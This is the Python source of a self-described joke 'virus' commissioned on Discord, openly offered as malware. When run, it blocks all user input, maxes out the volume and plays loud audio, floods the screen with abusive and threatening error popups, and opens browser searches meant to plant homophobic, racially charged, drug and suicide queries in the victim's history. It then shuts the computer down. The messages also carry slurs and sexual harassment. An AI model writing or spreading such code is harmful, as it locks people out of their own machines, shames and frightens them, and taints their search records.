# This virus was made by GLUR. And commissioned by Frosty#1982 on discord

# Fuck you, I'm not trimming libs or compressing media
# Pretty sure my parents think I'm gay after I ruined my search history making this virus.
# Do what you want with the src, cause it's hot garbage anyway.

# -----------------------------------------------------------------------------------------

# Importing libs I need...
import os
import sys

import pygame
import random
import webbrowser
import tkinter as tk

from ctypes import windll
from time import *
from os import startfile
from threading import Thread
from tkinter import messagebox

# Variables
timer = 0
thread_times = 696969
volume = 0

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

deez_mp3 = resource_path("deez.mp3")
deez_mov = resource_path("deez.mov")
deez1_mov = resource_path("deez1.mov")

# Arrays
search_terms = [
    "https://www.google.com/search?q=gay+nibbas+kissing&rlz=1C1VDKB_enNZ982NZ982&sxsrf=ALiCzsYA4lCx7iN20yv-3BqV3Yf0mnB0LA:1654233627499&source=lnms&tbm=isch&sa=X&ved=2ahUKEwj7_fe9xJD4AhWUwjgGHcgmCJkQ_AUoAXoECAEQAw&cshid=1654233634285208&biw=1920&bih=937&dpr=1",
    "https://www.google.com/search?q=where+to+buy+weed&rlz=1C1VDKB_enNZ982NZ982&sxsrf=ALiCzsa3eo55vx416qqFbUlKCFONjMv6Ww:1654233359616&source=lnms&tbm=shop&sa=X&ved=2ahUKEwij3Jm-w5D4AhUv8DgGHS0cDwEQ_AUoAXoECAIQAw&biw=1920&bih=937&dpr=1",
    "https://www.google.com/search?q=how+to+get+laid!1!!11!!&rlz=1C1VDKB_enNZ982NZ982&oq=how+to+get+laid!1!!11!!&aqs=chrome..69i57j33i160l4.12192j0j7&sourceid=chrome&ie=UTF-8",
    "https://www.google.com/search?q=big+black+guys&rlz=1C1VDKB_enNZ982NZ982&sxsrf=ALiCzsZ0idj7X-Zb6Z6Kb38v5WQw41yKGw:1654496313576&source=lnms&tbm=isch&sa=X&ved=2ahUKEwi-3LWIl5j4AhXD_DgGHeizCIYQ_AUoAXoECAEQAw&biw=1920&bih=937&dpr=1#imgrc=gEZJ4Of-KdYGjM",
    "https://www.google.com/search?q=I+want+to+kill+myself&rlz=1C1VDKB_enNZ982NZ982&oq=I+want+to+kill+myself&aqs=chrome..69i57.5504j0j7&sourceid=chrome&ie=UTF-8",
    "https://www.google.com/search?q=l+%2B+bozo+meaning&rlz=1C1VDKB_enNZ982NZ982&oq=L+%2B+bozo+meaning&aqs=chrome.0.0i512j0i22i30l2j0i390l4.5024j0j7&sourceid=chrome&ie=UTF-8",
    "https://www.google.com/search?q=big+buff+guys&rlz=1C1VDKB_enNZ982NZ982&sxsrf=ALiCzsZkzFxE1O6x_UPDdV348fHyCjiz7A:1654496253073&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiOg8nrlpj4AhU7yqACHUl6CGIQ_AUoAXoECAEQAw&biw=1920&bih=937&dpr=1",
    "https://www.google.com/search?q=no+bitches&rlz=1C1VDKB_enNZ982NZ982&sxsrf=ALiCzsZRUKxSOdThGB-RuE9NEF9xyMQ9Gw:1654496379316&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiAneKnl5j4AhUFxjgGHR0aAzsQ_AUoAXoECAEQAw&biw=1920&bih=937&dpr=1#imgrc=rKbmsSLAkHH5pM",
    "https://www.google.com/search?q=femboys&rlz=1C1VDKB_enNZ982NZ982&sxsrf=ALiCzsYGCoW2HmdUYRhhzU578I68xWJyAQ:1654496406871&source=lnms&tbm=isch&sa=X&ved=2ahUKEwjZ_fO0l5j4AhXC-jgGHcJUBG8Q_AUoAXoECAEQAw&biw=1920&bih=937&dpr=1"]

msg_terms = ["Still using this computer lol", "imagine running a sus exe file lmao",
             "stealing credit card infomation...", "doxxing your house", "sending a swat team to your area",
             "Are you still watching your gay porn", "Imagine being a fucking idiot",
             "I've seen you jacking off to catgirls, your going to helll"]

# Using this old messagebox snippet from another project. I could have optimized this as I only use the error message box in this but whatever.
def showMessage(message, type='info', timeout=250):
    import tkinter as tk
    from tkinter import messagebox as msgb

    root = tk.Tk()
    root.withdraw()
    try:
        root.after(timeout, root.destroy)
        if type == 'info':
            msgb.showinfo('Info', message, master=root)
        elif type == 'warning':
            msgb.showwarning('Warning', message, master=root)
        elif type == 'error':
            msgb.showerror('Error', message, master=root)
    except:
        pass

# Defining a method that just spams random error messages, and makes a REALLY annoying noise
def msg_thread(arg):
    for i in range(arg):
        showMessage(random.choice(msg_terms), type='error')

def virus_method_thread(arg):
    for i in range(arg):
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror("L + Get Fucked Bozo", "Your computer just got fucked in the ass hope you like black guys twerking")

# Defining a method that opens google and looks up random search queries. (See queries below vvv)
def search_thread(arg):
    for i in range(arg):
        webbrowser.get('C:/Program Files/Google/Chrome/Application/chrome.exe %s')
        webbrowser.open(random.choice(search_terms), new=1, autoraise=True)
        sleep(random.choice(range(8, 10)))

# Defining a method that plays a random video I found. Gonna pack the media in to the exe when I can
def video_thread(arg):
    for i in range(arg):
        startfile(deez_mov)
        sleep(8)
        startfile(deez1_mov)
        sleep(8)

# Message box alerting user that virus has been executed
thread = Thread(target=virus_method_thread, args=(1, ))
thread.start()

# Giving victim time to read message before payloads start
sleep(5)

# All user input is lock, stops interference
input_lock = windll.user32.BlockInput(True)

# Play earrape music in victims ears LMAO
while volume <= 100:
    pyautogui.press("volumeup")
    volume = volume + 1

pygame.mixer.init()
pygame.mixer.music.load(deez_mp3)
pygame.mixer.music.play(5)

# Starts all the method that where defined above
thread = Thread(target=msg_thread, args=(thread_times, ))
thread.start()
thread = Thread(target=search_thread, args=(thread_times, ))
thread.start()
thread = Thread(target=video_thread, args=(thread_times, ))
thread.start()

while timer <= 120:
    if timer == 120 - 10:
        thread.join()
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror("(Virus made by GLUR bitch)Your computers gonna shut down in 10 seconds btw, RIP", "I'm pretty sure my parents think I'm gay now, this virus is just a sus gay mess LMAO")
    else:
        sleep(1)
        timer = timer + 1

# After payloads have finished the computer will to L
os.system("shutdown /s /t 1")
